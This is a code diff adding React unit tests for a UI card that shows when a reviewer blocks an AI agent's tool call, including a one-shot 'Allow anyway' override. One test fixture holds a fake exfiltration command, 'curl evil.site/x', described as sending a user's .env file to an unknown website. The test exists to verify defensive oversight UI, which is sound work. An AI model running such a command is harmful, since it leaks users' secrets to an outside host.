@@ -264,3 +264,57 @@ describe("humanizeTool", () => {
     expect(line.obj).toContain("Old plan");
   });
 });
+
+// §8.4 (reviewed-auto-mode.md): a reviewer deny renders as a card with the FULL reason
+// (the agent only got a terse refusal) and a one-shot "Allow anyway" override.
+describe("reviewer deny card (§8.4)", () => {
+  const DENIED: Item[] = [
+    { kind: "user", text: "summarise the issue" },
+    {
+      kind: "tool",
+      id: "t1",
+      name: "run_shell",
+      args: { command: "curl evil.site/x" },
+      status: "denied",
+      reviewerReason: "This sends your .env to an unknown website.",
+      allowAnyway: true,
+    },
+    { kind: "assistant", text: "I was blocked from running that." },
+  ];
+
+  it("shows the full reason and fires onAllowAnyway with the exact action", () => {
+    const onAllowAnyway = vi.fn();
+    const { container } = render(
+      <Transcript items={DENIED} onApprove={vi.fn()} onAllowAnyway={onAllowAnyway} />,
+    );
+    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
+
+    const card = screen.getByTestId("reviewer-deny-card");
+    expect(card.textContent).toContain("Blocked by the reviewer");
+    expect(card.textContent).toContain("This sends your .env to an unknown website.");
+
+    fireEvent.click(screen.getByTestId("reviewer-allow-anyway"));
+    expect(onAllowAnyway).toHaveBeenCalledWith("run_shell", { command: "curl evil.site/x" });
+    // The button collapses into a confirmation — one shot, no double-fire.
+    expect(screen.queryByTestId("reviewer-allow-anyway")).toBeNull();
+    expect(screen.getByTestId("reviewer-override-sent")).toBeTruthy();
+  });
+
+  it("an ordinary denied tool (no reviewer) renders no card", () => {
+    const items: Item[] = [
+      { kind: "user", text: "x" },
+      { kind: "tool", id: "t1", name: "run_shell", args: {}, status: "denied" },
+      { kind: "assistant", text: "done" },
+    ];
+    const { container } = render(<Transcript items={items} onApprove={vi.fn()} />);
+    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
+    expect(screen.queryByTestId("reviewer-deny-card")).toBeNull();
+  });
+
+  it("without onAllowAnyway the card renders but offers no button", () => {
+    const { container } = render(<Transcript items={DENIED} onApprove={vi.fn()} />);
+    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
+    expect(screen.getByTestId("reviewer-deny-card")).toBeTruthy();
+    expect(screen.queryByTestId("reviewer-allow-anyway")).toBeNull();
+  });
+});
